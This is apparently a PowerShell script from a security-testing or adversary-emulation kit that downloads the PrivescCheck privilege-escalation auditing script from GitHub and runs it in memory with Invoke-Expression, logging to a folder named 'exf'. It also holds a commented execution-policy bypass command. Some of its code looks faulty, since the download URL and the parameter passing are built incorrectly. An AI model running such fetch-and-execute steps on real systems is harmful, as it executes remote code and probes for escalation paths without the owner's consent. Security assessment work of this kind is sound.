# Downloads and lastest PrivesCheck Powershell Script
# Checks Privileges Escalation in PowerShell
# Technic ID : xxx
Clear-Host
Write-Output "=========================================================================================="
Write-Output "  Downloads and use PrivescCheck.ps1 to check Privileges escalation possibilites  (Txxx)"
Write-Output "=========================================================================================="
################ [ List of commpiled programs to downlad ] ################
$Ps1ScriptToUse = @("PrivescCheck.ps1")
$ExecuteFrom = "https://github.com/itm4n/PrivescCheck/releases/latest/download"
#powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"
$ScriptParameters = " -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT"
################ [ GLOBAL VARIABLES ] ################
$TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff K"
$LogFile = "$env:PUBLIC\exf\Tool_PrivescCheck.txt";
################ [ MAIN BODY ] ################
Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding utf8 -Force
Write-output "-------------------------------------"  | Out-File -FilePath $LogFile -Encoding utf8 -Append
Write-output "Script : $PSCommandPath has been launched on $TimeStamp" | Out-File -FilePath $LogFile -Encoding utf8 -Append
Write-output "-------------------------------------"  | Out-File -FilePath $LogFile -Encoding utf8 -Append
Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
foreach ($Tool in $Ps1ScriptToUse) 
{
    $DownloadRun = $ExecuteFrom+"/"+$Ps1ScriptToUse
    $RemoteCode = (Invoke-WebRequest -Uri $DownloadRun -UseBasicParsing).Content
    Invoke-Expression -Command $RemoteCode $ScriptParameters
  }